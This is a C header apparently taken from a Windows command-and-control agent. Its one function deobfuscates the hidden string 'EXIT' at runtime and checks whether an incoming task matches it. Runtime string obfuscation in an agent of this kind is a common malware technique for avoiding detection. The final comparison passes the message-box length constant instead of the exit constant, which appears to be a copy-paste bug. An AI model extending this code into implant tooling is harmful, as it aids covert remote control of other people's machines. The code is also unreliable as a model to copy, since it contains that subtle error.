#pragma once

#include <Windows.h>
#include "constants.h"
#include "utils/buffer.h"
#include "executor/messagebox.h"
#include "utils/winapi.h"

/*
Checks a Tasks string to see if it's for Exit
*/
BOOL IsTaskForExit(LPVOID pTask)
{
    if (pTask == NULL)
        return FALSE;

    // Check number of elements
    if (NullSeparatedArrayNumOfStringElements((PCHAR)pTask) != 1)
        return FALSE;

    // Compare "EXIT"
    static CHAR strAgentCapExit[STRING_AGENT_CAP_EXIT_LEN + 1] = ""; // "EXIT"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_CAP_EXIT,
        STRING_AGENT_CAP_EXIT_LEN,
        strAgentCapExit);

    return CompareBuffer(pTask, strAgentCapExit, STRING_AGENT_CAP_MESSAGEBOX_LEN);
}
